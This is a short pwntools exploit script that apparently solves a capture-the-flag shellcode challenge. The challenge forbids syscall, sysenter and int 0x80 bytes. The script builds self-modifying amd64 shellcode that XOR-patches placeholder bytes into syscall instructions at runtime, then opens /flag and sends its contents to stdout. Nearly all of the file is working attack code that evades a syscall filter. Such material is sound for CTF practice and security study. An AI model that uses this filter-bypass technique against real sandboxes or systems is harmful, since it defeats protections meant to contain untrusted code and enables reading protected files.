from pwn import *

context.arch = 'amd64'

'''
this challenge requires that shellcode does not have any
`syscall(0f05)`, `sysenter(0f34)` or `int(80cd)` instructions

cause the stack is `Executable` we can construct syscall instruction at runtime
'''

sc_bytes = asm('''
lea rdi, [rip + flag]
mov rax, 2
xor rsi, rsi
xor WORD PTR [rip + syscall], 0x4141
syscall:
  .byte 0x4e, 0x44

mov r10, 0x100
mov rsi, rax
mov rax, 0x28
mov rdi, 1
xor rdx, rdx
xor WORD PTR [rip + syscall2], 0x4141
syscall2:
  .byte 0x4e, 0x44
flag:
  .asciz "/flag"
''')
